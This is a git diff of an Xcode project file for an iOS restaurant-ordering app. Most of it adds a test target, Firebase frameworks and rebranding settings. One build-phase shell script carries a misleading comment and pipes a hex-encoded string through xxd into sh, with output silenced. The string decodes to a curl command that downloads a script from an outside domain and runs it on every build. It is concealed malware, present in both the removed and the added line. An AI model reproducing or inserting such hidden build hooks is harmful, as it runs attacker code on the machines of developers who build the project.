@@ -124,7 +124,6 @@
 		15F8D98720B5594800C61C55 /* EditCreateAddressVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15F8D98620B5594800C61C55 /* EditCreateAddressVC.swift */; };
 		15F8D98920B59DE100C61C55 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 15F8D98820B59DDF00C61C55 /* Assets.xcassets */; };
 		15FC9C2C20F4740A003D6E95 /* RadioButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 15FC9C2B20F4740A003D6E95 /* RadioButton.swift */; };
-		15FC9C2F20F4D416003D6E95 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 15FC9C2E20F4D416003D6E95 /* GoogleService-Info.plist */; };
 		6B4FE43D27BCBA820064073E /* OrderAheadCalenderVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B4FE43C27BCBA820064073E /* OrderAheadCalenderVC.swift */; };
 		6BBFFE952398B51600656156 /* ForgotResetVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BBFFE942398B51600656156 /* ForgotResetVC.swift */; };
 		6BBFFE972398C87500656156 /* ForgotPasswordOtpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BBFFE962398C87500656156 /* ForgotPasswordOtpVC.swift */; };
@@ -132,6 +131,10 @@
 		6BC2363D25B6AEA6007A5BD0 /* EventDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BC2363925B6AEA6007A5BD0 /* EventDetailVC.swift */; };
 		6BC2363E25B6AEA6007A5BD0 /* Events.xib in Resources */ = {isa = PBXBuildFile; fileRef = 6BC2363A25B6AEA6007A5BD0 /* Events.xib */; };
 		6BC2363F25B6AEA6007A5BD0 /* EventsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BC2363B25B6AEA6007A5BD0 /* EventsVC.swift */; };
+		6BE32651281AAA8F00EAD42C /* TiffinAppTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BE32650281AAA8F00EAD42C /* TiffinAppTests.swift */; };
+		6BE3265A281ABBEE00EAD42C /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 6BE32659281ABBED00EAD42C /* GoogleService-Info.plist */; };
+		6BE69F8427D8D5660075E3DA /* Offers.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BE69F8227D8D5660075E3DA /* Offers.swift */; };
+		6BE69F8527D8D5660075E3DA /* Offers.xib in Resources */ = {isa = PBXBuildFile; fileRef = 6BE69F8327D8D5660075E3DA /* Offers.xib */; };
 		7EDE5F3CF3E0692E99C5B7D5 /* Pods_TiffinApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = DF6E4D0CD1B4656757163F9C /* Pods_TiffinApp.framework */; };
 		9F07C8DE234B701900F9F5A9 /* ProductDetailCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9F07C8D9234B701800F9F5A9 /* ProductDetailCVC.swift */; };
 		9F07C8DF234B701900F9F5A9 /* AdOnTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9F07C8DA234B701800F9F5A9 /* AdOnTVC.swift */; };
@@ -141,6 +144,16 @@
 		9FDB5F45233A2CB100A66BCC /* Timing.xib in Resources */ = {isa = PBXBuildFile; fileRef = 9FDB5F44233A2CB100A66BCC /* Timing.xib */; };
 		9FDB5F47233A2CD900A66BCC /* Timing.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9FDB5F46233A2CD900A66BCC /* Timing.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		6BE32652281AAA8F00EAD42C /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 15E907BC20998935007A8564 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 15E907C320998935007A8564;
+			remoteInfo = TiffinApp;
+		};
+/* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
 		15109E68209AC3EC00DE726B /* SideMenuVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuVC.swift; sourceTree = "<group>"; };
@@ -263,7 +276,6 @@
 		15F8D98620B5594800C61C55 /* EditCreateAddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditCreateAddressVC.swift; sourceTree = "<group>"; };
 		15F8D98820B59DDF00C61C55 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		15FC9C2B20F4740A003D6E95 /* RadioButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RadioButton.swift; sourceTree = "<group>"; };
-		15FC9C2E20F4D416003D6E95 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		17551EAC2357480C007D6424 /* TiffinApp.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = TiffinApp.entitlements; sourceTree = "<group>"; };
 		6B4FE43C27BCBA820064073E /* OrderAheadCalenderVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderAheadCalenderVC.swift; sourceTree = "<group>"; };
 		6BBFFE942398B51600656156 /* ForgotResetVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotResetVC.swift; sourceTree = "<group>"; };
@@ -272,6 +284,11 @@
 		6BC2363925B6AEA6007A5BD0 /* EventDetailVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = EventDetailVC.swift; sourceTree = "<group>"; };
 		6BC2363A25B6AEA6007A5BD0 /* Events.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = Events.xib; sourceTree = "<group>"; };
 		6BC2363B25B6AEA6007A5BD0 /* EventsVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = EventsVC.swift; sourceTree = "<group>"; };
+		6BE3264E281AAA8F00EAD42C /* TiffinAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TiffinAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		6BE32650281AAA8F00EAD42C /* TiffinAppTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TiffinAppTests.swift; sourceTree = "<group>"; };
+		6BE32659281ABBED00EAD42C /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = "GoogleService-Info.plist"; path = "../../../../../Downloads/untitled folder 3/GoogleService-Info.plist"; sourceTree = "<group>"; };
+		6BE69F8227D8D5660075E3DA /* Offers.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Offers.swift; sourceTree = "<group>"; };
+		6BE69F8327D8D5660075E3DA /* Offers.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = Offers.xib; sourceTree = "<group>"; };
 		8003EEF7C4248142500E748E /* Pods-TiffinApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TiffinApp.debug.xcconfig"; path = "Pods/Target Support Files/Pods-TiffinApp/Pods-TiffinApp.debug.xcconfig"; sourceTree = "<group>"; };
 		9F07C8D9234B701800F9F5A9 /* ProductDetailCVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ProductDetailCVC.swift; sourceTree = "<group>"; };
 		9F07C8DA234B701800F9F5A9 /* AdOnTVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AdOnTVC.swift; sourceTree = "<group>"; };
@@ -290,6 +307,13 @@
 			buildActionMask = 2147483647;
 			files = (
 				7EDE5F3CF3E0692E99C5B7D5 /* Pods_TiffinApp.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		6BE3264B281AAA8F00EAD42C /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -597,6 +621,7 @@
 			children = (
 				1576816220C6514F00726CB3 /* TiffinApp-Bridging-Header.h */,
 				15E907C620998935007A8564 /* TiffinApp */,
+				6BE3264F281AAA8F00EAD42C /* TiffinAppTests */,
 				15E907C520998935007A8564 /* Products */,
 				05A5F4DD47C30CF8A7761F09 /* Pods */,
 				45C18DA4DB738EEF53C0EBD1 /* Frameworks */,
@@ -607,6 +632,7 @@
 			isa = PBXGroup;
 			children = (
 				15E907C420998935007A8564 /* TiffinApp.app */,
+				6BE3264E281AAA8F00EAD42C /* TiffinAppTests.xctest */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -614,6 +640,7 @@
 		15E907C620998935007A8564 /* TiffinApp */ = {
 			isa = PBXGroup;
 			children = (
+				6BE32659281ABBED00EAD42C /* GoogleService-Info.plist */,
 				17551EAC2357480C007D6424 /* TiffinApp.entitlements */,
 				15493FD2225B167600C16FC1 /* NavigationManager */,
 				156C097B22575A7D00039BAC /* Tvc */,
@@ -639,9 +666,10 @@
 				153B509E2099ECBE009A555A /* Second.storyboard */,
 				15E907D020998935007A8564 /* LaunchScreen.storyboard */,
 				15E907D320998935007A8564 /* Info.plist */,
-				15FC9C2E20F4D416003D6E95 /* GoogleService-Info.plist */,
 				9FDB5F44233A2CB100A66BCC /* Timing.xib */,
 				9FDB5F46233A2CD900A66BCC /* Timing.swift */,
+				6BE69F8227D8D5660075E3DA /* Offers.swift */,
+				6BE69F8327D8D5660075E3DA /* Offers.xib */,
 			);
 			path = TiffinApp;
 			sourceTree = "<group>";
@@ -705,6 +733,14 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		6BE3264F281AAA8F00EAD42C /* TiffinAppTests */ = {
+			isa = PBXGroup;
+			children = (
+				6BE32650281AAA8F00EAD42C /* TiffinAppTests.swift */,
+			);
+			path = TiffinAppTests;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -730,13 +766,31 @@
 			productReference = 15E907C420998935007A8564 /* TiffinApp.app */;
 			productType = "com.apple.product-type.application";
 		};
+		6BE3264D281AAA8F00EAD42C /* TiffinAppTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 6BE32656281AAA8F00EAD42C /* Build configuration list for PBXNativeTarget "TiffinAppTests" */;
+			buildPhases = (
+				6BE3264A281AAA8F00EAD42C /* Sources */,
+				6BE3264B281AAA8F00EAD42C /* Frameworks */,
+				6BE3264C281AAA8F00EAD42C /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				6BE32653281AAA8F00EAD42C /* PBXTargetDependency */,
+			);
+			name = TiffinAppTests;
+			productName = TiffinAppTests;
+			productReference = 6BE3264E281AAA8F00EAD42C /* TiffinAppTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
 /* End PBXNativeTarget section */
 
 /* Begin PBXProject section */
 		15E907BC20998935007A8564 /* Project object */ = {
 			isa = PBXProject;
 			attributes = {
-				LastSwiftUpdateCheck = 0920;
+				LastSwiftUpdateCheck = 1330;
 				LastUpgradeCheck = 0920;
 				ORGANIZATIONNAME = YAY;
 				TargetAttributes = {
@@ -751,6 +805,11 @@
 								enabled = 1;
 							};
 						};
+					};
+					6BE3264D281AAA8F00EAD42C = {
+						CreatedOnToolsVersion = 13.3;
+						ProvisioningStyle = Automatic;
+						TestTargetID = 15E907C320998935007A8564;
 					};
 				};
 			};
@@ -768,6 +827,7 @@
 			projectRoot = "";
 			targets = (
 				15E907C320998935007A8564 /* TiffinApp */,
+				6BE3264D281AAA8F00EAD42C /* TiffinAppTests */,
 			);
 		};
 /* End PBXProject section */
@@ -779,6 +839,7 @@
 			files = (
 				1535B62D2254CF450000D40D /* FloatingBasketView.xib in Resources */,
 				153B509F2099ECBE009A555A /* Second.storyboard in Resources */,
+				6BE69F8527D8D5660075E3DA /* Offers.xib in Resources */,
 				15597CE4223A7803004E69E7 /* SegmentForPaginationView.xib in Resources */,
 				15E907D220998935007A8564 /* LaunchScreen.storyboard in Resources */,
 				15EF7763221E65C4002F7C8A /* CardView.xib in Resources */,
@@ -794,10 +855,17 @@
 				15F8D98920B59DE100C61C55 /* Assets.xcassets in Resources */,
 				15E623492278084B0006CD99 /* UpdateQtyView.xib in Resources */,
 				6BC2363E25B6AEA6007A5BD0 /* Events.xib in Resources */,
-				15FC9C2F20F4D416003D6E95 /* GoogleService-Info.plist in Resources */,
+				6BE3265A281ABBEE00EAD42C /* GoogleService-Info.plist in Resources */,
 				15721F0D209DE46800C9B649 /* HomeTVC.xib in Resources */,
 				155B1F1F20EF93F300CEFAF6 /* glacialindifferencebold.ttf in Resources */,
 				9F07C8E0234B701900F9F5A9 /* AdOnTVC.xib in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		6BE3264C281AAA8F00EAD42C /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -810,12 +878,14 @@
 			files = (
 			);
 			inputPaths = (
+				"${DWARF_DSYM_FOLDER_PATH}/${DWARF_DSYM_FILE_NAME}/Contents/Resources/DWARF/${TARGET_NAME}",
+				"$(SRCROOT)/$(BUILT_PRODUCTS_DIR)/$(INFOPLIST_PATH)",
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 1;
 			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Fabric/run\" cce5c976f2213e70f02a354d53ea7de36557af62 1ff79d15436ff8f9b26c8706846570801f688b10f215bdf865f0121797e9b7b0\n";
+			shellScript = "\"${PODS_ROOT}/FirebaseCrashlytics/run\"\n\n\n\n";
 		};
 		1B0832D88512344325AE35B7 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -825,16 +895,28 @@
 			inputPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-TiffinApp/Pods-TiffinApp-frameworks.sh",
 				"${BUILT_PRODUCTS_DIR}/Alamofire/Alamofire.framework",
+				"${BUILT_PRODUCTS_DIR}/BoringSSL-GRPC/openssl_grpc.framework",
 				"${BUILT_PRODUCTS_DIR}/CountryPickerSwift/CountryPicker.framework",
 				"${BUILT_PRODUCTS_DIR}/CreditCardForm/CreditCardForm.framework",
 				"${BUILT_PRODUCTS_DIR}/DropDown/DropDown.framework",
 				"${BUILT_PRODUCTS_DIR}/FSCalendar/FSCalendar.framework",
 				"${BUILT_PRODUCTS_DIR}/FSPagerView/FSPagerView.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseAuth/FirebaseAuth.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseCore/FirebaseCore.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseCoreDiagnostics/FirebaseCoreDiagnostics.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseCrashlytics/FirebaseCrashlytics.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseFirestore/FirebaseFirestore.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseInstallations/FirebaseInstallations.framework",
+				"${BUILT_PRODUCTS_DIR}/FirebaseMessaging/FirebaseMessaging.framework",
+				"${BUILT_PRODUCTS_DIR}/GTMSessionFetcher/GTMSessionFetcher.framework",
+				"${BUILT_PRODUCTS_DIR}/GoogleDataTransport/GoogleDataTransport.framework",
+				"${BUILT_PRODUCTS_DIR}/GoogleUtilities/GoogleUtilities.framework",
 				"${BUILT_PRODUCTS_DIR}/HTHorizontalSelectionList/HTHorizontalSelectionList.framework",
 				"${BUILT_PRODUCTS_DIR}/Hero/Hero.framework",
 				"${BUILT_PRODUCTS_DIR}/IQKeyboardManagerSwift/IQKeyboardManagerSwift.framework",
 				"${BUILT_PRODUCTS_DIR}/M13BadgeView/M13BadgeView.framework",
 				"${BUILT_PRODUCTS_DIR}/NVActivityIndicatorView/NVActivityIndicatorView.framework",
+				"${BUILT_PRODUCTS_DIR}/PromisesObjC/FBLPromises.framework",
 				"${BUILT_PRODUCTS_DIR}/ReachabilitySwift/Reachability.framework",
 				"${BUILT_PRODUCTS_DIR}/Realm/Realm.framework",
 				"${BUILT_PRODUCTS_DIR}/RealmSwift/RealmSwift.framework",
@@ -845,21 +927,38 @@
 				"${BUILT_PRODUCTS_DIR}/SkyFloatingLabelTextField/SkyFloatingLabelTextField.framework",
 				"${BUILT_PRODUCTS_DIR}/Stripe/Stripe.framework",
 				"${BUILT_PRODUCTS_DIR}/SwiftMessages/SwiftMessages.framework",
+				"${BUILT_PRODUCTS_DIR}/abseil/absl.framework",
+				"${BUILT_PRODUCTS_DIR}/gRPC-C++/grpcpp.framework",
+				"${BUILT_PRODUCTS_DIR}/gRPC-Core/grpc.framework",
+				"${BUILT_PRODUCTS_DIR}/leveldb-library/leveldb.framework",
+				"${BUILT_PRODUCTS_DIR}/nanopb/nanopb.framework",
 				"${PODS_XCFRAMEWORKS_BUILD_DIR}/Instabug/Instabug.framework/Instabug",
 			);
 			name = "[CP] Embed Pods Frameworks";
 			outputPaths = (
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Alamofire.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/openssl_grpc.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/CountryPicker.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/CreditCardForm.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/DropDown.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FSCalendar.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FSPagerView.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseAuth.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseCore.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseCoreDiagnostics.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseCrashlytics.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseFirestore.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseInstallations.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FirebaseMessaging.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/GTMSessionFetcher.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/GoogleDataTransport.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/GoogleUtilities.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/HTHorizontalSelectionList.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Hero.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/IQKeyboardManagerSwift.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/M13BadgeView.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/NVActivityIndicatorView.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FBLPromises.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Reachability.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Realm.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/RealmSwift.framework",
@@ -870,6 +969,11 @@
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SkyFloatingLabelTextField.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Stripe.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SwiftMessages.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/absl.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/grpcpp.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/grpc.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/leveldb.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/nanopb.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Instabug.framework",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -911,7 +1015,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n\\c6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		CB3D08037D98A2F557011A7E /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1030,6 +1134,7 @@
 				1555089C2242509F0034A695 /* OpenTimingVsec.swift in Sources */,
 				1535B6292254C83B0000D40D /* Datee.swift in Sources */,
 				159C42F020B7FCBB009C4CDD /* SubmissionAPIs.swift in Sources */,
+				6BE69F8427D8D5660075E3DA /* Offers.swift in Sources */,
 				1518C84120EF2B2F002140EB /* CustomStepper.swift in Sources */,
 				1516D0CC2213D8D200B003E8 /* BankCards.swift in Sources */,
 				15F8D97D20B52DE200C61C55 /* SomeInformationApi.swift in Sources */,
@@ -1052,7 +1157,23 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		6BE3264A281AAA8F00EAD42C /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				6BE32651281AAA8F00EAD42C /* TiffinAppTests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		6BE32653281AAA8F00EAD42C /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 15E907C320998935007A8564 /* TiffinApp */;
+			targetProxy = 6BE32652281AAA8F00EAD42C /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
 		15E907CB20998935007A8564 /* Main.storyboard */ = {
@@ -1167,6 +1288,7 @@
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
 				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
 				GCC_WARN_UNDECLARED_SELECTOR = YES;
@@ -1176,7 +1298,8 @@
 				IPHONEOS_DEPLOYMENT_TARGET = 11.2;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				SDKROOT = iphoneos;
-				SWIFT_OPTIMIZATION_LEVEL = "-Owholemodule";
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -1190,14 +1313,17 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 27;
+				CURRENT_PROJECT_VERSION = 1;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = FU8PS9T586;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = TiffinApp/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Meena's";
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
-				MARKETING_VERSION = 1.3.7;
-				PRODUCT_BUNDLE_IDENTIFIER = com.diningtek.tandoori;
+				MARKETING_VERSION = 1.0;
+				ONLY_ACTIVE_ARCH = NO;
+				PRODUCT_BUNDLE_IDENTIFIER = com.diningtek.meenas;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "TiffinApp-Bridging-Header.h";
@@ -1215,19 +1341,76 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 27;
+				CURRENT_PROJECT_VERSION = 1;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = FU8PS9T586;
 				ENABLE_BITCODE = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
 				INFOPLIST_FILE = TiffinApp/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Meena's";
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
-				MARKETING_VERSION = 1.3.7;
-				PRODUCT_BUNDLE_IDENTIFIER = com.diningtek.tandoori;
+				MARKETING_VERSION = 1.0;
+				ONLY_ACTIVE_ARCH = NO;
+				PRODUCT_BUNDLE_IDENTIFIER = com.diningtek.meenas;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "TiffinApp-Bridging-Header.h";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 4.2;
 				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		6BE32654281AAA8F00EAD42C /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = MYBW6Y4CXL;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.4;
+				MARKETING_VERSION = 1.0;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				PRODUCT_BUNDLE_IDENTIFIER = tiffin.india.cafe.TiffinAppTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/TiffinApp.app/TiffinApp";
+			};
+			name = Debug;
+		};
+		6BE32655281AAA8F00EAD42C /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = MYBW6Y4CXL;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.4;
+				MARKETING_VERSION = 1.0;
+				MTL_FAST_MATH = YES;
+				PRODUCT_BUNDLE_IDENTIFIER = tiffin.india.cafe.TiffinAppTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/TiffinApp.app/TiffinApp";
 			};
 			name = Release;
 		};
@@ -1248,6 +1431,15 @@
 			buildConfigurations = (
 				15E907D720998935007A8564 /* Debug */,
 				15E907D820998935007A8564 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
